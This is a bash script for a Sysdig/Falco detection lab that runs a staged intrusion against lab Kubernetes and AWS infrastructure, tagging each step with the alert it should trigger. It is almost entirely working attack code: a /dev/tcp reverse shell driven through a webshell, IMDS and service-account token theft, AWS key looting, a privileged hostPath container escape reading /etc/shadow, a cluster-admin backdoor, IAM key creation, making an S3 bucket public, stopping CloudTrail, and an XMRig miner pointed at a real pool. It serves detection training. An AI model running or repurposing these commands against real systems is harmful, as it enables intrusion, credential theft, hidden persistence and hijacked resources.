#!/usr/bin/env bash
# =============================================================================
#  Sysdig detection lab - attack driver (smoke & mirrors kill chain)
#
#  Simulates a realistic intrusion against the victim infra deployed by
#  infra/deploy-k8s.sh + infra/deploy-aws.sh. Each step maps to a Sysdig /
#  Falco detection (see the [DETECT] tags). Designed to run unattended during
#  lab setup, leaving a full forensic trail for the student to investigate.
#
#  Usage:
#    ./attack.sh            run the full kill chain
#    ./attack.sh --cleanup  revert attack-created artifacts (keeps victim infra)
#    PHASES="1 2 5" ./attack.sh   run only selected phases
# =============================================================================
set -uo pipefail
NS=attack-demo
VICTIM_SVC="vuln-app.${NS}.svc.cluster.local:8080"
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
STATE="$DIR/.attack-state"
INFRA_STATE="$DIR/../infra/.infra-state"

c()   { printf '\n\033[1;31m### %s\033[0m\n' "$*"; }      # phase banner
step(){ printf '  \033[1;33m[*]\033[0m %s\n' "$*"; }       # action
det() { printf '      \033[0;36m[DETECT] %s\033[0m\n' "$*"; }

# Run a command in the attacker C2 pod
att() { kubectl -n "$NS" exec attacker -- bash -lc "$*"; }
# Drive RCE in the victim through the webshell (tomcat-style ?cmd=)
websh() { kubectl -n "$NS" exec attacker -- curl -s --max-time "${2:-60}" --get \
            "http://${VICTIM_SVC}/tomcatwar.jsp" \
            --data-urlencode "pwd=j" --data-urlencode "cmd=$1"; }

# -----------------------------------------------------------------------------
phase1_initial_access() {
  c "PHASE 1 - Initial access & discovery (runtime / Falco)"
  local AIP
  AIP=$(kubectl -n "$NS" get pod attacker -o jsonpath='{.status.podIP}')

  step "Starting reverse-shell listener on attacker ($AIP:4444)"
  kubectl -n "$NS" exec attacker -- bash -lc "timeout 30 nc -lvnp 4444 >/tmp/rev.out 2>&1" &
  sleep 2

  step "Triggering reverse shell from victim via webshell"
  det "Falco: Reverse shell / Unexpected outbound connection"
  websh "bash -i >& /dev/tcp/${AIP}/4444 0>&1 & sleep 3" 10 || true

  step "Hands-on-keyboard discovery through the webshell"
  det "Falco: Terminal shell in container"
  det "Falco: System information discovery"
  websh "id; uname -a; hostname; cat /etc/os-release | head -3; w; crontab -l 2>/dev/null"

  step "Package management launched in running container (attacker installs tooling)"
  det "Falco: Launch package management process in container"
  websh "apt-get update >/dev/null 2>&1 && apt-get install -y wget curl >/dev/null 2>&1; echo installed: \$(command -v wget) \$(command -v curl)" 180 || true
}

# -----------------------------------------------------------------------------
phase2_credential_access() {
  c "PHASE 2 - Credential access (runtime -> cloud bridge)"

  step "Querying EC2 Instance Metadata Service for role credentials"
  det "Falco: Contact EC2 Instance Metadata Service / Cloud credential theft"
  websh "python3 -c \"import urllib.request as u; print(u.urlopen('http://169.254.169.254/latest/meta-data/iam/security-credentials/',timeout=5).read().decode())\" 2>/dev/null || echo '(no role / IMDS blocked - attempt still logged)'" 15

  step "Reading mounted Kubernetes service-account token"
  det "Falco: Read sensitive file / K8s service account token accessed"
  websh "cat /var/run/secrets/kubernetes.io/serviceaccount/token | head -c 40; echo ...; cat /var/run/secrets/kubernetes.io/serviceaccount/namespace"

  step "Looting cloud credentials present in the app environment"
  det "Falco: Read sensitive file below /etc or credential file access"
  AK=$(websh 'env | grep AWS_ACCESS_KEY_ID | cut -d= -f2' | tr -d "\r\n ")
  SK=$(websh 'env | grep AWS_SECRET_ACCESS_KEY | cut -d= -f2' | tr -d "\r\n ")
  websh "mkdir -p /tmp/resources && env | grep AWS_ > /tmp/resources/aws_creds.env && cat /tmp/resources/aws_creds.env | sed 's/=.*/=<redacted>/'"
  if [[ -n "$AK" && -n "$SK" ]]; then
    { echo "STOLEN_AK=$AK"; echo "STOLEN_SK=$SK"; } >> "$STATE"
    step "Exfiltrated AWS keys (will be used in Phase 5)"
  else
    step "No app creds found; Phase 5 will fall back to ambient creds"
  fi
}

# -----------------------------------------------------------------------------
phase3b_escape() {
  c "PHASE 3B - Container escape to the node (classic / safe)"
  det "K8s audit + Falco: Launch privileged container"
  det "Falco: Mount sensitive filesystem / Container escape"

  step "Deploying a privileged escape pod with hostPath / mounted"
  cat <<'YAML' | kubectl apply -f - >/dev/null
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
  namespace: attack-demo
  labels: {app: escape-pod}
spec:
  hostPID: true
  hostNetwork: true
  containers:
    - name: esc
      image: busybox:1.36
      command: ["sleep","infinity"]
      securityContext:
        privileged: true
      volumeMounts:
        - {name: host, mountPath: /host}
  volumes:
    - name: host
      hostPath: {path: /, type: Directory}
YAML
  kubectl -n "$NS" wait --for=condition=Ready pod/escape-pod --timeout=120s || true

  step "Reading host-only files from inside the container (node breakout)"
  det "Falco: Sensitive file opened for reading (host /etc/shadow)"
  kubectl -n "$NS" exec escape-pod -- chroot /host /bin/sh -c \
    "head -2 /etc/shadow; ls -la /etc/kubernetes/admin.conf 2>/dev/null; echo ESCAPED_AS=\$(id -u)" || true
  echo "ESCAPE_POD=escape-pod" >> "$STATE"
}

# -----------------------------------------------------------------------------
phase4_persistence() {
  c "PHASE 4 - Persistence: take over the K8s control plane (audit)"
  det "K8s audit: ClusterRoleBinding to cluster-admin created"
  det "K8s audit: Privileged pod created via API"

  step "Granting cluster-admin to the compromised service account"
  cat <<'YAML' | kubectl apply -f - >/dev/null
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: attacker-backdoor-admin
  labels: {app.kubernetes.io/part-of: sysdig-attack-lab}
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
  - kind: ServiceAccount
    name: default
    namespace: attack-demo
YAML
  echo "CRB=attacker-backdoor-admin" >> "$STATE"
  step "Verifying escalated privileges"
  kubectl auth can-i '*' '*' --as=system:serviceaccount:attack-demo:default || true
}

# -----------------------------------------------------------------------------
phase5_cloud_pivot() {
  c "PHASE 5 - Pivot to AWS with stolen credentials (CloudTrail / CDR)"
  # Build an isolated profile from the stolen keys (fall back to ambient creds)
  local AK SK
  AK=$(grep -s STOLEN_AK "$STATE" | tail -1 | cut -d= -f2)
  SK=$(grep -s STOLEN_SK "$STATE" | tail -1 | cut -d= -f2)
  export AWS_PROFILE=
  if [[ -n "${AK:-}" && -n "${SK:-}" ]]; then
    aws configure set aws_access_key_id "$AK" --profile stolen
    aws configure set aws_secret_access_key "$SK" --profile stolen
    aws configure set region "${AWS_REGION:-us-east-1}" --profile stolen
    export AWS_PROFILE=stolen
    step "Using stolen credentials (profile: stolen)"
  fi
  local A=(aws); [[ -n "${AWS_PROFILE:-}" ]] && A=(aws --profile stolen)

  step "Cloud reconnaissance with the compromised identity"
  det "Sysdig CDR: Cloud reconnaissance (sts/iam enumeration)"
  "${A[@]}" sts get-caller-identity
  "${A[@]}" iam list-users --max-items 5 >/dev/null 2>&1 && echo "  iam:ListUsers ok"
  "${A[@]}" iam list-roles --max-items 5 >/dev/null 2>&1 && echo "  iam:ListRoles ok"

  step "Persistence in cloud: creating a new IAM access key (backdoor)"
  det "Sysdig CDR: IAM access key created"
  local ME NEWKEY
  ME=$("${A[@]}" sts get-caller-identity --query Arn --output text | awk -F/ '{print $NF}')
  NEWKEY=$("${A[@]}" iam create-access-key --user-name "$ME" \
            --query 'AccessKey.AccessKeyId' --output text 2>/dev/null) \
    && { echo "NEW_AK=$NEWKEY"; echo "NEW_AK_USER=$ME"; } >> "$STATE" \
    && echo "  created access key $NEWKEY for $ME" \
    || echo "  (no iam:CreateAccessKey permission - skipped)"

  step "Data exposure: making the loot bucket public"
  det "Sysdig CDR: S3 bucket public access granted"
  local LOOT
  LOOT=$(grep -s LOOT_BUCKET "$INFRA_STATE" | cut -d= -f2)
  if [[ -n "${LOOT:-}" ]]; then
    "${A[@]}" s3api put-public-access-block --bucket "$LOOT" \
      --public-access-block-configuration \
      BlockPublicAcls=false,IgnorePublicAcls=false,BlockPublicPolicy=false,RestrictPublicBuckets=false \
      && echo "  public access block removed on $LOOT"
    "${A[@]}" s3api put-bucket-policy --bucket "$LOOT" --policy "{
      \"Version\":\"2012-10-17\",
      \"Statement\":[{\"Sid\":\"PublicRead\",\"Effect\":\"Allow\",\"Principal\":\"*\",
      \"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::$LOOT/*\"}]}" 2>/dev/null \
      && echo "  public-read policy applied to $LOOT"
  fi

  step "Defense evasion: disabling CloudTrail logging"
  det "Sysdig CDR: CloudTrail logging disabled (StopLogging)"
  local TRAIL
  TRAIL=$(grep -s '^TRAIL=' "$INFRA_STATE" | cut -d= -f2)
  if [[ -n "${TRAIL:-}" ]]; then
    "${A[@]}" cloudtrail stop-logging --name "$TRAIL" \
      && echo "  StopLogging called on trail $TRAIL"
  fi
  unset AWS_PROFILE
}

# -----------------------------------------------------------------------------
phase6_impact_miner() {
  c "PHASE 6 - Impact: resource hijacking (cryptominer)"
  det "Falco: Crypto mining activity / Outbound connection to mining pool"
  det "Falco: Drift detection - new executable run in container"
  step "Downloading + launching XMRig (Monero) through the webshell"
  local URL="https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz"
  websh "cd /tmp && { command -v wget >/dev/null && wget -q -O xmrig.tar.gz '$URL'; } || { command -v curl >/dev/null && curl -sL -o xmrig.tar.gz '$URL'; } || python3 -c \"import urllib.request; urllib.request.urlretrieve('$URL','/tmp/xmrig.tar.gz')\"; tar -xf xmrig.tar.gz && echo downloaded" 180
  websh 'printf "set -x\nwhile true; do /tmp/xmrig-6.16.4/xmrig --donate-level 100 -o xmr-us-east1.nanopool.org:14433 -k -u 422skia35WvF9mVq9Z9oCMRtoEunYQ5kHPvRqpH1rGCv1BzD5dUY4cD8wiCMp4KQEYLAN1BuawbUEJE99SNrTv9N9gf2TWC --tls --coin monero --background && sleep 20 && pkill xmrig; done\n" > /tmp/crypto_run.sh; chmod +x /tmp/crypto_run.sh'
  websh "nohup /tmp/crypto_run.sh >/tmp/miner.log 2>&1 & disown; sleep 4; echo miner-started" 15
  echo "MINER=on" >> "$STATE"
}

# -----------------------------------------------------------------------------
cleanup() {
  c "CLEANUP - reverting attack-created artifacts"
  [[ -f "$STATE" ]] && source "$STATE" || true
  step "Stopping cryptominer in victim"
  websh "pkill -f crypto_run.sh; pkill xmrig; rm -rf /tmp/xmrig* /tmp/crypto_run.sh" 15 2>/dev/null || true
  step "Deleting escape pod"
  kubectl -n "$NS" delete pod escape-pod --ignore-not-found
  step "Deleting backdoor ClusterRoleBinding"
  kubectl delete clusterrolebinding attacker-backdoor-admin --ignore-not-found
  if [[ -n "${NEW_AK:-}" && -n "${NEW_AK_USER:-}" ]]; then
    step "Deleting backdoor IAM access key $NEW_AK"
    aws iam delete-access-key --user-name "$NEW_AK_USER" --access-key-id "$NEW_AK" 2>/dev/null || true
  fi
  if [[ -f "$INFRA_STATE" ]]; then
    local LOOT TRAIL
    LOOT=$(grep -s LOOT_BUCKET "$INFRA_STATE" | cut -d= -f2)
    TRAIL=$(grep -s '^TRAIL=' "$INFRA_STATE" | cut -d= -f2)
    if [[ -n "${LOOT:-}" ]]; then
      step "Re-securing loot bucket $LOOT"
      aws s3api delete-bucket-policy --bucket "$LOOT" 2>/dev/null || true
      aws s3api put-public-access-block --bucket "$LOOT" \
        --public-access-block-configuration \
        BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true 2>/dev/null || true
    fi
    if [[ -n "${TRAIL:-}" ]]; then
      step "Re-enabling CloudTrail logging on $TRAIL"
      aws cloudtrail start-logging --name "$TRAIL" 2>/dev/null || true
    fi
  fi
  rm -f "$STATE"
  step "Cleanup complete (victim infra left intact)."
}

# -----------------------------------------------------------------------------
main() {
  if [[ "${1:-}" == "--cleanup" ]]; then cleanup; exit 0; fi
  : > "$STATE"
  local phases="${PHASES:-1 2 3b 4 5 6}"
  for p in $phases; do
    case "$p" in
      1)  phase1_initial_access ;;
      2)  phase2_credential_access ;;
      3b) phase3b_escape ;;
      4)  phase4_persistence ;;
      5)  phase5_cloud_pivot ;;
      6)  phase6_impact_miner ;;
    esac
  done
  c "KILL CHAIN COMPLETE - go investigate in Sysdig Secure"
}
main "$@"
